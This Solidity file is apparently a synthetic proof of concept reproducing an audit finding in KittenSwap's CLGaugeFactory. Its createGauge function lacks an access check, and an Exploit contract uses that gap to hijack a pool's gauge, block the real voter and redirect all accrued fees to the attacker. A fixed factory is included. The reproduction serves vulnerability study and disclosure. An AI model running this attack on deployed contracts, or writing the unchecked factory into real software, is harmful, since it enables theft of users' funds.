// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  KittenSwap CLGaugeFactory — unauthorized gauge creation (Pashov, H-06, #58017)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: createGauge has no `msg.sender == voter` check, then calls
    CLPool.setGaugeAndPositionManager, which accepts the first caller only.
    The attacker-chosen internal bribe later receives the pool's accrued fees
    because the official gauge forwards them there. The real voter path reverts. */

contract FeeToken {
    string public name = "Pool fee";
    string public symbol = "FEE";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract CLPool {
    address public factory;
    address public gauge;
    address public nft;
    FeeToken public immutable fee;

    constructor(FeeToken _fee, address _factory) {
        fee = _fee;
        factory = _factory;
    }

    function setFactory(address _factory) external {
        require(factory == address(0), "factory set");
        factory = _factory;
    }

    /// @dev Verbatim gate from the finding: the pool gauge can be pinned once.
    function setGaugeAndPositionManager(address _gauge, address _nft) external {
        require(msg.sender == factory, "only gauge factory");
        require(gauge == address(0), "gauge set");
        gauge = _gauge;
        nft = _nft;
    }

    /// @dev Official CL gauges pull the pool's accrued fees and forward them.
    function collectTo(address to) external returns (uint256 amt) {
        require(msg.sender == gauge, "only gauge");
        amt = fee.balanceOf(address(this));
        require(amt > 0, "no fees");
        fee.transfer(to, amt);
    }
}

contract CLGauge {
    CLPool public pool;
    address public internalBribe;
    address public kitten;
    bool public isPool;

    function initialize(
        address _pool,
        address _internal_bribe,
        address _kitten,
        address,
        address,
        address,
        bool _isPool
    ) external {
        pool = CLPool(_pool);
        internalBribe = _internal_bribe;
        kitten = _kitten;
        isPool = _isPool;
    }

    function claimFees() external returns (uint256 amt) {
        amt = pool.collectTo(internalBribe);
    }
}

interface ICLGaugeFactory {
    function createGauge(address pool, address internalBribe, address kitten, bool isPool)
        external
        returns (address);
}

contract CLGaugeFactory {
    address public voter;
    address public nfp;
    address public immutable kitten;
    mapping(address => address) public gaugeFor;
    mapping(address => bool) public isGauge;

    constructor(address _voter, address _kitten) {
        voter = _voter;
        kitten = _kitten;
        nfp = address(0xBEEF);
    }

    /// @dev Finding body, reduced only by replacing ERC1967Proxy with `new CLGauge`.
    ///      FIX: require(msg.sender == voter, "Only voter can create gauge");
    function createGauge(address _pool, address _internal_bribe, address _kitten, bool _isPool)
        external
        returns (address)
    {
        CLGauge newGauge = new CLGauge();
        newGauge.initialize(_pool, _internal_bribe, _kitten, voter, voter, nfp, _isPool);
        CLPool(_pool).setGaugeAndPositionManager(address(newGauge), nfp); // @> VULN: anyone pins the pool's one-shot gauge
        gaugeFor[_pool] = address(newGauge);
        isGauge[address(newGauge)] = true;
        return address(newGauge);
    }
}

contract CLGaugeFactoryFixed {
    address public voter;
    address public nfp;
    address public immutable kitten;
    mapping(address => address) public gaugeFor;
    mapping(address => bool) public isGauge;

    constructor(address _voter, address _kitten) {
        voter = _voter;
        kitten = _kitten;
        nfp = address(0xBEEF);
    }

    function createGauge(address _pool, address _internal_bribe, address _kitten, bool _isPool)
        external
        returns (address)
    {
        require(msg.sender == voter, "Only voter can create gauge");
        CLGauge newGauge = new CLGauge();
        newGauge.initialize(_pool, _internal_bribe, _kitten, voter, voter, nfp, _isPool);
        CLPool(_pool).setGaugeAndPositionManager(address(newGauge), nfp);
        gaugeFor[_pool] = address(newGauge);
        isGauge[address(newGauge)] = true;
        return address(newGauge);
    }
}

contract Voter {
    ICLGaugeFactory public factory;
    address public protocolBribe;

    constructor(address _protocolBribe) {
        protocolBribe = _protocolBribe;
    }

    function setFactory(address _factory) external {
        require(address(factory) == address(0), "factory set");
        factory = ICLGaugeFactory(_factory);
    }

    function createCLGauge(address _pool) external returns (address) {
        return factory.createGauge(_pool, protocolBribe, address(0xCAFE), true);
    }
}

contract Exploit {
    uint256 public constant EMISSIONS = 5_000 ether;

    FeeToken public fee;
    CLPool public pool;
    Voter public voter;
    CLGaugeFactory public factory;
    address public attackerGauge;
    bool public legitBlocked;
    uint256 public feesForwarded;

    constructor() {
        fee = new FeeToken();
        voter = new Voter(address(0xB0B));
        factory = new CLGaugeFactory(address(voter), address(0xCAFE));
        pool = new CLPool(fee, address(factory));
        voter.setFactory(address(factory));
        fee.mint(address(pool), EMISSIONS);
    }

    function run() external {
        uint256 accrued = fee.balanceOf(address(pool));
        require(accrued == EMISSIONS, "pool fees");
        require(pool.gauge() == address(0), "gauge unset");

        address g = factory.createGauge(address(pool), msg.sender, address(0xCAFE), true);
        attackerGauge = g;
        require(factory.isGauge(g), "not treated as real");
        require(pool.gauge() == g, "pool gauge");

        try voter.createCLGauge(address(pool)) returns (address) {
            legitBlocked = false;
        } catch {
            legitBlocked = true;
        }
        require(legitBlocked, "voter path still open");

        uint256 paid = CLGauge(g).claimFees();
        feesForwarded = paid;
        require(paid == EMISSIONS, "gauge did not pull fees");
        require(fee.balanceOf(msg.sender) == EMISSIONS, "attacker missed emissions");
        require(fee.balanceOf(address(pool)) == 0, "fees left on pool");
    }
}
